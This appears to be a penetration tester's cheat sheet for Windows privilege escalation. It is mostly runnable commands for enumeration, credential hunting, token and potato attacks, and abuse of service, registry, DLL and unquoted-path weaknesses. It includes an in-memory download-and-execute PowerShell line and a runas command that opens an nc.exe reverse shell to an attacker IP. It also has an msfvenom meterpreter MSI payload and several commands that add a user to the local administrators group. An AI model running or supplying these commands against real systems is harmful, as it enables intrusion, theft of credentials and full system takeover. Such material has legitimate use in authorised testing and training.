**Resources:**

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

- [Sushant747 Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)

- [Absolomb Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

**Manual Enumeration:**

 System:
 
    systeminfo   
    wmic qfe get Caption,Description,HotFixID,InstalledOn  #Patch info   
    wmic logicaldisk get caption,description,providername  #Disk info
    
    dir <file> /s /p   #Find file name. /s search all folders on HD, /p pause on each screen
    
  [powershell for pentesting](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)   
    
  User:
  
    whoami /priv #privileges for current user    
    whoami /groups    
    net user 
    net user <user> 

  Network: 
  
    ipconfig
    arp -a
    route print
    netstat -ano
    
   If you find network services that are only available to the local host or a dualhomed NIC you may want to [port forward](https://github.com/Kahvi-0/Cheat-Sheets/blob/master/Post%20exploitation/Windows/Port%20forwarding.md) them to your host 
    
  Password hunting:

     findstr /si password *.txt *.ini *.config
     
  AV: 
  
      sc query windefend
      sc queryex type= service
      
  Firewall:
  
      netsh advfirewall firewall dump
      netsh firewall show state
      netsh firewall show config

**Automated Enumeration**

-------------------------------------------------------------------------------------

- [winPEAS .bat](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat)

      wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
      
 - [winPEAS .exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
      
-------------------------------------------------------------------------------------
    
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

  - PowerUp:
 
        wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

Run powershell and run the following to download and run in memory

    iex(New-Object Net.WebClient).DownloadString('http://<ip>:<port>PowerUp.ps1')
    
Run from disk

    . .\PowerUp.ps1
    Invoke-AllChecks
  
    powershell -ep bypass .\PowerUp.ps1  # For meterpreter shell that gets stuck
    
-------------------------------------------------------------------------------------


- [Windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

      wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py && chmod +x windows-exploit-suggester.py && ./windows-exploit-suggester.py --update
      
      # This download and will create an .xlsx database
      
       CMD "systeminfo" saved to a file 
      
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt 
      
      # Without 
      
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'

-------------------------------------------------------------------------------------


- Meterpreter exploit suggester module

      post/multi/recon/local_exploit_suggester


-------------------------------------------------------------------------------------

[Meterpreter getsystem](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/)

 Note: technique 2 writes to disk ! Which means that it can get caught by AV.

-------------------------------------------------------------------------------------

**[Kernel](https://github.com/Kahvi-0/General-Notes/blob/master/Processes%20and%20architecture/Kernel.md) Exploits**

  Knowing the build of the OS is importent to knowing what kernel version is running and what vulnerabilties that kernel version might have. If you can own the kernel, you own the system.
  
 - Research Kernel exploits shown from tool output such as the exploit suggesters.
  
 - [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

-------------------------------------------------------------------------------------


**Password Hunting**

- Cleartext:

   Note that a lot of these will also be included in the automated enumeration tools

  - [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords)
 
- Hashed: 

  - [Pentest lab](https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/)

  - [mimikatz](https://github.com/Kahvi-0/Tools-and-Concepts/blob/master/Windows/Mimikatz.md)

     - Need process with permissions to be able to interact with the running lsass.exe process
        -  ran as NT AUTHORITY\SYSTEM
        -  Must be same arch as the lsass.exe running on the target
        
-------------------------------------------------------------------------------------

    
**[Token impersonation](https://github.com/Kahvi-0/Vulnerabilities-and-Exploitations/blob/master/Windows/Token%20impersonation%20%7C%20potato%20attacks.md) and potato attacks**

    whoami /priv  #windows shell
    getprivs      #meterpreter
    
  [Privileges and how to escalate](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges) to look for.
  
  [Juicy potato](https://github.com/ohpe/juicy-potato)
  
  [Tater](https://github.com/Kevin-Robertson/Tater) Powershell version of hot potato.
  
    powershell.exe -nop -ep bypass
    Import-Module Tater.ps1
    Invoke-Tater -Trigger 1 -Command "net localgroup administrators <username> add"
  
   Meterpreter version of potato attack. Requires a meterpreter session with the same architecture as the target.

    exploit/windows/local/ms16_075_reflection_juicy   #Windows 10
    exploit/windows/local/ms16_075_reflection

-------------------------------------------------------------------------------------
   
**[RUNAS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas)**
 
 Get a copy of nc.exe onto the target

    runas /savecred /user:<machine>\<user> "nc.exe -nv <IP> <port> -e cmd.exe"
   
-------------------------------------------------------------------------------------

**Registry related**

*Autoruns*

Requires a privileged account to login to tigger the autorun program to execute with admin privs. 
Using [Sysinternal tools](https://live.sysinternals.com/) Autoruns and accesschk we are going to check for programs that autorun.
Autoruns uses a GUI. Command to identify modifiable autorun programs: 

    accesschk64.exe -wvu "<image path identified in Autoruns>"

      -w programs that have write access
      -v verbose
      -u suppress errors

Modifiable Autoruns programs will also be identified using PowerUp.

Generate a payload for a shell and replace the modifiable program. 

*AlwaysInstallElevated*

Newly installed MSI packages (windows installers) will installed with elevated privileges (as admin user). If the registry key is 1, then it is installed. Powerup will look for this.

Detect - Tested on Windows 7:

    reg query HKLM\Software\Policies\Microsoft\Windows\Installer
    reg query HKCU\Software\Policies\Microsoft\Windows\Installer
    
Exploit:

After powerup has been invoked. If this is exploitable, powerup's output will give you a command to run that will generate an MSI file that will create a new admin user, This requires a GUI.

CLI version is to generate a payload MSI installer with a shell.

    msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<port> -f msi -o setup.msi 
    msiexec /quiet /qn /i setup.msi
    
Eleveate a lowlevel meterpreter session:

    use exploit/windows/local/always_install_elevated

*[regsvc](https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool) ACL*

Checking the ACL of the registry service to see if we have full control over a registry key. Then we generate a malicious exe to run under the registry using image path. So when regsvc is started it will run our exe.

Detect:

    Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl   

Exploit:

 Compile [Windows service](https://github.com/Kahvi-0/Cheat-Sheets/blob/master/Post%20exploitation/Windows/resources/windows_service.c) with the desired command to be ran. Example: cmd.exe /k net localgroup administrators <username> /add

    x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
    
    i686-w64-mingw32-gcc # for x86
    
    reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\<path to exe> /f

-------------------------------------------------------------------------------------

**Executables**

Powerup can identify service executables that we have full access to. We can replace that exe file with our malicious one and restart the service, now running our exe. Powerup will identify the service name and exe location.
 Compile [Windows service](https://github.com/Kahvi-0/Cheat-Sheets/blob/master/Post%20exploitation/Windows/resources/windows_service.c) with the desired command to be ran and replace the service exe with the new exe. Example: cmd.exe /k net localgroup administrators <username> /add

    sc start <service>
  
-------------------------------------------------------------------------------------

**Startup applications**

When a system boots (and a user logs in) it will run the startup application. 
Check the startup directory to see if the user has write (or full) permissions. 

    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    
Now add a file there to be ran once a user is logged on.

-------------------------------------------------------------------------------------

**DLL Hijacking**

DLL are like executables but not executable, they run with executables. Looking for exe that call a non-existant DLL in a writable path.

Detect: 

- Download any suspect exe files and run in a windows environment with [Sysinternal tools procmon](https://live.sysinternals.com/).
Filter for "Result is NAME NOT FOUND" and "PATH ends with  .dll". 
- PowerUp: Find-PathDLLHijack PowerUp.ps1

[Template DLL file](https://github.com/Kahvi-0/Cheat-Sheets/blob/master/Post%20exploitation/Windows/resources/windows_dll.c)

Compile:

    <i686-w64-mingw32-gcc | x86_64-w64-mingw32-gcc> windows_dll.c -shared -o output.dll
    
You can also create an msfvenom dll. 

-------------------------------------------------------------------------------------

**Binary paths**

Look for the "SERVICE_CHANGE_CONFIG".

Detect:

- [accesschk64.exe](https://live.sysinternals.com/) -uwcv Everyone *

- [accesschk64.exe](https://live.sysinternals.com/) -uwcv <service>

- PowerUp will also list this 

Exploit: 

    sc qc <service>  # To query the service. Look at BINARY_PATH_NAME.

    sc config <service> binpath = "net localgroup administrators <user> /add "
    
-------------------------------------------------------------------------------------

**Unquoted Service Path**

Where a service exe is not enclosed in quotes and contains a space.
Example of how this works:

Unquoted service path example: C:\Program Files\Common Files\text.exe
The service will try to run Program.exe, Program Files.exe, Common.exe, Common Files.exe, text.exe
 
    sc query <service> 
    sc stop <service>  #to test a restart

 
Create a malicious exe and place it in the path with the approriate name that the service will try for that location.

    sc start <service>

-------------------------------------------------------------------------------------
 
